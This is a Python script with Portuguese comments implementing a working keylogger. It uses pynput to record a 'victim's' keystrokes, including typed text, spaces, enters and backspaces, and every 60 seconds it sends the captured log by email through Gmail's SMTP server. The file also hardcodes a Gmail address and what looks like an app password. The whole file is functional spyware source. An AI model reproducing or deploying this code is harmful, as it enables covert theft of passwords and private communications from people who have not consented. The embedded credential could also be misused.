#1. Importando as bibliotecas
""" As bibliotecas pynput capturam as teclas, a smtplib envia o e-mail, o Mime formata o conteúdo como mensagem de texto, e o Timer da biblioteca threading permite que agendemos a cadência de envio dos e-mails. """

from pynput import keyboard
import smtplib
from email.mime.text import MIMEText 
from threading import Timer

log = ""

#2. Configurando o e-mail
""" Na senha do e-mail inserimos a senha de app exclusiva gerada pelo Google. O log é onde as teclas digitadas serão armazenadas temporariamente. Na função enviar e-mail, que é responsável por enviar o e-mail com o conteúdo capturado, estamos utilizando o servidor SMTP do gmail que é o smtp.gmail.com porta 587. Aqui estamos criando a mensagem, fazendo login, enviando o e-mail e limpando o log """

EMAIL_ORIGEM = "testando1pc@gmail.com"
EMAIL_DESTINO = "testando1pc@gmail.com"
SENHA_EMAIL = "dlgk jzxb wcbx rrpp"

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capturados pelo keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To']= EMAIL_DESTINO
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar", e)

        log = ""

#3. Agendando o envio de e-mail com os dados capturados/digitados a cada 60 segundos
    Timer(60, enviar_email).start()

#4. Capturando a digitação da vítima
""" Nessa função, se a tecla for comum ela entra direto no log, se for espaço, enter, backspace tratamos de forma individualizada. Se as teclas digitadas forem shift, control, etc cairão no else e serão ignoradas. """

def on_press(key):
    global log
    try: 
        log+= key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log +=" "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log += "[<]"
        else:
            pass #Vai ignorar control, shift, etc...

#5. Iniciando o keylogger e o envio automático

with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()
